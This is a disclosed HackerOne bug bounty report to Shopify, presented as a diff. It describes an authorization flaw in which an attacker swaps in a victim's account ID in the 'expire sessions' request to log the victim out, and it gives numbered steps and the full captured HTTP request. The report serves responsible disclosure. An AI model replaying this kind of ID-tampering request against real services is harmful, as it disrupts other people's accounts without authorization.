@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/56511
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/sappi
+ReportedTo:Shopify(shopify)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:17.04.2015 1:32:54
+
+Summary:
+
+Hi
+
+here attacker able to expire other user session just changing the request 
+
+Steps:
+1. Login as Attacker
+2. Go to account settings
+3. Click on expire all session and capture request 
+4. replace account id with victim and forward 
+5. victim account logged out
+
+request
+POST /admin/settings/account/expire_specific_users_sessions/7641433 HTTP/1.1
+Host: don432.myshopify.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://don432.myshopify.com/admin/settings/account/7641433
+Cookie: __utma=1.652371099.1420114739.1428608063.1429133861.3; __utmz=1.1428608063.2.2.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; __insp_slim=1428608118179; __insp_wid=723062851; __insp_nv=true; __insp_ref=aHR0cHM6Ly9hcHAuc2hvcGlmeS5jb20vc2VydmljZXMvc2lnbnVwL3NldHVw; __insp_norec_sess=true; _ga=GA1.2.652371099.1420114739; _ab=1; storefront_digest=b4ed3ef7ad8e531a7b8ec20bf70aa78c21eebe0f4062879ce3a064bd785bc7fe; __utmb=1.15.10.1429133861; __utmc=1; _secure_admin_session_id=ddbf71351a2a38541dee544204810315; _gat=1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+
+utf8=%E2%9C%93&_method=patch&authenticity_token=ttrjwIKbLTYDSprUu9pAvTma%2BdxbIWn9mrjvYSb1Lok%3D
+
+
+in post request just change 7641433 with victim id
+
+hope you understand
